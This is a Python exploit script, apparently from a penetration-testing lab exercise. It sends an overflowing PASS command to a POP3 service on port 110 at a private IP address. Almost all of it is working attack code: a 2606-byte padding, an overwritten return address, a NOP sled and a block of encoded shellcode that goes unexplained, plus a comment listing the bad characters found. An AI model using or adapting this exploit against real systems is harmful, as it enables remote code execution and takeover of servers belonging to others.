#!/usr/bin/python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Found Bad Chars = \x00\x0a\x0d
shellcode = ("\xbe\x95\x9a\x51\x43\xdb\xcd\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"
"\x52\x83\xef\xfc\x31\x77\x0e\x03\xe2\x94\xb3\xb6\xf0\x41\xb1"
"\x39\x08\x92\xd6\xb0\xed\xa3\xd6\xa7\x66\x93\xe6\xac\x2a\x18"
"\x8c\xe1\xde\xab\xe0\x2d\xd1\x1c\x4e\x08\xdc\x9d\xe3\x68\x7f"
"\x1e\xfe\xbc\x5f\x1f\x31\xb1\x9e\x58\x2c\x38\xf2\x31\x3a\xef"
"\xe2\x36\x76\x2c\x89\x05\x96\x34\x6e\xdd\x99\x15\x21\x55\xc0"
"\xb5\xc0\xba\x78\xfc\xda\xdf\x45\xb6\x51\x2b\x31\x49\xb3\x65"
"\xba\xe6\xfa\x49\x49\xf6\x3b\x6d\xb2\x8d\x35\x8d\x4f\x96\x82"
"\xef\x8b\x13\x10\x57\x5f\x83\xfc\x69\x8c\x52\x77\x65\x79\x10"
"\xdf\x6a\x7c\xf5\x54\x96\xf5\xf8\xba\x1e\x4d\xdf\x1e\x7a\x15"
"\x7e\x07\x26\xf8\x7f\x57\x89\xa5\x25\x1c\x24\xb1\x57\x7f\x21"
"\x76\x5a\x7f\xb1\x10\xed\x0c\x83\xbf\x45\x9a\xaf\x48\x40\x5d"
"\xcf\x62\x34\xf1\x2e\x8d\x45\xd8\xf4\xd9\x15\x72\xdc\x61\xfe"
"\x82\xe1\xb7\x51\xd2\x4d\x68\x12\x82\x2d\xd8\xfa\xc8\xa1\x07"
"\x1a\xf3\x6b\x20\xb1\x0e\xfc\x45\x4d\x10\x42\x31\x53\x10\xbb"
"\x79\xda\xf6\xd1\x6d\x8b\xa1\x4d\x17\x96\x39\xef\xd8\x0c\x44"
"\x2f\x52\xa3\xb9\xfe\x93\xce\xa9\x97\x53\x85\x93\x3e\x6b\x33"
"\xbb\xdd\xfe\xd8\x3b\xab\xe2\x76\x6c\xfc\xd5\x8e\xf8\x10\x4f"
"\x39\x1e\xe9\x09\x02\x9a\x36\xea\x8d\x23\xba\x56\xaa\x33\x02"
"\x56\xf6\x67\xda\x01\xa0\xd1\x9c\xfb\x02\x8b\x76\x57\xcd\x5b"
"\x0e\x9b\xce\x1d\x0f\xf6\xb8\xc1\xbe\xaf\xfc\xfe\x0f\x38\x09"
"\x87\x6d\xd8\xf6\x52\x36\xf8\x14\x76\x43\x91\x80\x13\xee\xfc"
"\x32\xce\x2d\xf9\xb0\xfa\xcd\xfe\xa9\x8f\xc8\xbb\x6d\x7c\xa1"
"\xd4\x1b\x82\x16\xd4\x09")


buffer = "A"*2606 + "\x8f\x35\x4a\x5f"  + "\x90" * 16 +  shellcode + "C"* (3500-2606-4-351-16)
#buffer = "A"*2606 + "B"*4 + badchars
try:
	print "\nSending evil buffer..."
	s.connect(('10.11.22.57',110))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nDone!."
except:
	print "Could not connect to POP3!"
